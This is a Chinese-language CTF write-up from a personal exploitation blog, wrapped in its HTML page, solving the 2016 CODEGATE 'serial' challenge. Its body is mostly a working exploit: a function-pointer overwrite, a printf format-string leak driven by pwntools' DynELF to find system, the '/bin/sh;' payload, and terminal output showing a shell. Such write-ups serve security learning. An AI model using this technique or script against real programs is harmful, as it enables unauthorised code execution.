@@ -1,0 +1,848 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="fsb,DynELF," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="我忍不住又刷题了….这道题还是值得一做，让我对DynELF有了更深入的理解，更重要的是还学了点angr。 Challenge程序的逻辑很简单，首先用calloc分配10个连续0x20大小的块，然后验证key，这里就需要angr了，当然也可以手动分析。然后就是一般的玩法了，给个菜单你自己去琢磨怎么搞。漏洞还是很好找。">
+<meta name="keywords" content="fsb,DynELF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2016 CODEGATE CTF serial">
+<meta property="og:url" content="http://yoursite.com/2017/05/14/2016-CODEGATE-CTF-serial/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="我忍不住又刷题了….这道题还是值得一做，让我对DynELF有了更深入的理解，更重要的是还学了点angr。 Challenge程序的逻辑很简单，首先用calloc分配10个连续0x20大小的块，然后验证key，这里就需要angr了，当然也可以手动分析。然后就是一般的玩法了，给个菜单你自己去琢磨怎么搞。漏洞还是很好找。">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2016 CODEGATE CTF serial">
+<meta name="twitter:description" content="我忍不住又刷题了….这道题还是值得一做，让我对DynELF有了更深入的理解，更重要的是还学了点angr。 Challenge程序的逻辑很简单，首先用calloc分配10个连续0x20大小的块，然后验证key，这里就需要angr了，当然也可以手动分析。然后就是一般的玩法了，给个菜单你自己去琢磨怎么搞。漏洞还是很好找。">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/05/14/2016-CODEGATE-CTF-serial/"/>
+
+
+  <title> 2016 CODEGATE CTF serial | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                2016 CODEGATE CTF serial
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2017-05-14T03:41:02+08:00" content="2017-05-14">
+              2017-05-14
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/ctf-practice/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf_practice</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/05/14/2016-CODEGATE-CTF-serial/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/05/14/2016-CODEGATE-CTF-serial/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>我忍不住又刷题了….这道题还是值得一做，让我对DynELF有了更深入的理解，更重要的是还学了点angr。</p>
+<h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p><a href="https://github.com/w0lfzhang/ctfs/blob/master/2016-codegate-ctf/serial" target="_blank" rel="external">程序</a>的逻辑很简单，首先用calloc分配10个连续0x20大小的块，然后验证key，这里就需要<a href="http://angr.io/" target="_blank" rel="external">angr</a>了，当然也可以手动分析。然后就是一般的玩法了，给个菜单你自己去琢磨怎么搞。漏洞还是很好找。<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rax@3</span></div><div class="line">  <span class="keyword">char</span> s[<span class="number">8</span>]; <span class="comment">// [sp+10h] [bp-30h]@3</span></div><div class="line">  __int64 v4; <span class="comment">// [sp+18h] [bp-28h]@3</span></div><div class="line">  __int64 v5; <span class="comment">// [sp+20h] [bp-20h]@3</span></div><div class="line">  __int64 v6; <span class="comment">// [sp+28h] [bp-18h]@3</span></div><div class="line">  __int64 v7; <span class="comment">// [sp+38h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v7 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">9</span> )</div><div class="line">  &#123;</div><div class="line">    *(_QWORD *)s = <span class="number">0L</span>L;</div><div class="line">    v4 = <span class="number">0L</span>L;</div><div class="line">    v5 = <span class="number">0L</span>L;</div><div class="line">    v6 = <span class="number">0L</span>L;</div><div class="line">    *(_QWORD *)(<span class="number">32L</span>L * count + a1 + <span class="number">24</span>) = func;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"insert &gt;&gt; "</span>);</div><div class="line">    input(s);</div><div class="line">    v1 = <span class="built_in">strlen</span>(s);</div><div class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(<span class="number">32L</span>L * count + a1), s, v1);</div><div class="line">    ++count;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"full"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v7;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>问题就是能读入31个字符，能把后面的函数地址给覆盖。然后你调用dump函数时会执行这个函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">dump</span><span class="params">(__int64 a1)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></div><div class="line"></div><div class="line">  result = *(_BYTE *)a1;</div><div class="line">  <span class="keyword">if</span> ( (_BYTE)result )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"func : %p\n"</span>, *(_QWORD *)(a1 + <span class="number">24</span>));</div><div class="line">    result = (*(<span class="keyword">int</span> (__fastcall **)(__int64))(a1 + <span class="number">24</span>))(a1);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>刚开始思路是把函数地址覆盖为printf@plt的地址，然后就按照printf的读写套路来。可是问题是这题一没libc，二是格式化字符串在堆上…这咋整?</p>
+<p>后来google了下，这题可以用DynELF来整？纳尼，好像记得用DynELF还是去年，以后就基本没用过了….而且DynELF一般的话有write和puts函数还好用，想不到还能用printf(其实只是经验少没用过而已)。刚开始看wp的时候没明白，格式化串在堆上啊，咋leak啊?</p>
+<p>真是套路满满啊，在输入选项的时候能读入数据而且就在栈上~~<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">   0x400a16:	mov    rax,QWORD PTR [rbp-0x8]</div><div class="line">   0x400a1a:	mov    rdi,rax</div><div class="line">   0x400a1d:	mov    eax,0x0</div><div class="line">=&gt; 0x400a22:	call   rdx</div><div class="line">   0x400a24:	nop</div><div class="line">   0x400a25:	leave  </div><div class="line">   0x400a26:	ret    </div><div class="line">   0x400a27:	push   rbp</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0x603010 --&gt; 0x61616161 ('aaaa')</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffdd60 --&gt; 0x0 </div><div class="line">0008| 0x7fffffffdd68 --&gt; 0x603010 --&gt; 0x61616161 ('aaaa')</div><div class="line">0016| 0x7fffffffdd70 --&gt; 0x7fffffffddc0 --&gt; 0x0 </div><div class="line">0024| 0x7fffffffdd78 --&gt; 0x400fa9 (jmp    0x400fd7)</div><div class="line">0032| 0x7fffffffdd80 --&gt; 0x1 </div><div class="line">0040| 0x7fffffffdd88 --&gt; 0x603010 --&gt; 0x61616161 ('aaaa')</div><div class="line">0048| 0x7fffffffdd90 ("3fuckyou")</div><div class="line">0056| 0x7fffffffdd98 --&gt; 0x0 </div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, 0x0000000000400a22 in ?? ()</div></pre></td></tr></table></figure></p>
+<p>我们可以输入3fuckyou + p64(addr)，然后确定addr是printf的第几个参数，第13个，很稳。这样在add的时候输入以下数据就行了。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">BB%</span>13$sCC".ljust(24) + p64(printf_plt)</div></pre></td></tr></table></figure></p>
+<p>接着可以leak system函数的地址，然后add的时候输入：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">'/bin/sh;'.ljust(24) + p64(system)</div></pre></td></tr></table></figure></p>
+<p>注意/bin/sh后面得跟’;’，跟\x00是不行的，会被strlen截断的。</p>
+<h2 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">debug = <span class="number">1</span></div><div class="line"><span class="keyword">if</span> debug:</div><div class="line">    p = process(<span class="string">'./serial'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(s)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"choice &gt;&gt; "</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">"insert &gt;&gt; "</span>)</div><div class="line">    p.sendline(s)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(id)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"choice &gt;&gt; "</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</div><div class="line">    p.sendline(str(id))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(choice_id)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"choice &gt;&gt; "</span>)</div><div class="line">    p.sendline(choice_id)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"input product key: "</span>)</div><div class="line">p.sendline(<span class="string">'615066814080'</span>)</div><div class="line"></div><div class="line">printf_plt = <span class="number">0x400790</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    add(<span class="string">"BB%13$sCC"</span>.ljust(<span class="number">24</span>) + p64(printf_plt))</div><div class="line">    dump(<span class="string">"3AAAAAAA"</span> + p64(addr))</div><div class="line">    </div><div class="line">    p.recvuntil(<span class="string">"BB"</span>)</div><div class="line"></div><div class="line">    data = p.recvuntil(<span class="string">"CC"</span>)[:<span class="number">-2</span>] + <span class="string">"\x00"</span> <span class="comment">#must adding \x00, becuase must leaking at least one byte data, </span></div><div class="line">    <span class="comment">#print len(data)                       #however addr's content may be empty</span></div><div class="line">    remove(<span class="number">0</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line">d = DynELF(leak, elf = ELF(<span class="string">'./serial'</span>))</div><div class="line">system_addr = d.lookup(<span class="string">"system"</span>, <span class="string">"libc.so"</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</div><div class="line"></div><div class="line">add(<span class="string">'/bin/sh;'</span>.ljust(<span class="number">24</span>) + p64(system_addr)) <span class="comment">#attention, adding \x00 not working</span></div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">dump(<span class="string">'3'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>美滋滋：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">w0lfzhang@w0lfzhang666:~/Desktop/ctfs/code-gate$ python exp.py </div><div class="line">[+] Starting local process './serial': pid 75557</div><div class="line">[*] '/home/w0lfzhang/Desktop/ctfs/code-gate/serial'</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[+] Loading from '/home/w0lfzhang/Desktop/ctfs/code-gate/serial': 0x7ffff7ffe1c8</div><div class="line">[+] Resolving 'system' in 'libc.so': 0x7ffff7ffe1c8</div><div class="line">[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.</div><div class="line">[*] Magic did not match</div><div class="line">[*] .gnu.hash/.hash, .strtab and .symtab offsets</div><div class="line">[*] Found DT_GNU_HASH at 0x7ffff7dd2c00</div><div class="line">[*] Found DT_STRTAB at 0x7ffff7dd2c10</div><div class="line">[*] Found DT_SYMTAB at 0x7ffff7dd2c20</div><div class="line">[*] .gnu.hash parms</div><div class="line">[*] hash chain index</div><div class="line">[*] hash chain</div><div class="line">system_addr: 0x7ffff7a58590</div><div class="line">[*] Switching to interactive mode</div><div class="line">hey! (nil)</div><div class="line">Smash me!</div><div class="line">1. Add 2. Remove 3. Dump 4. Quit</div><div class="line">choice &gt;&gt; func : 0x7ffff7a58590</div><div class="line"><span class="meta">$</span> id</div><div class="line">uid=1000(w0lfzhang) gid=1000(w0lfzhang) groups=1000(w0lfzhang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/fsb/" rel="tag">#fsb</a>
+          
+            <a href="/tags/DynELF/" rel="tag">#DynELF</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/13/Kernel-Exploit-Stack-Smashing/" rel="next" title="Kernel Exploit: Stack Smashing">
+                <i class="fa fa-chevron-left"></i> Kernel Exploit: Stack Smashing
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/28/2017-RCTF-Recho/" rel="prev" title="2017 RCTF Recho">
+                2017 RCTF Recho <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">58</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">93</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Script"><span class="nav-number">3.</span> <span class="nav-text">Script</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2017/05/14/2016-CODEGATE-CTF-serial/';
+      var disqus_title = "2016 CODEGATE CTF serial";
+      var disqus_url = 'http://yoursite.com/2017/05/14/2016-CODEGATE-CTF-serial/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
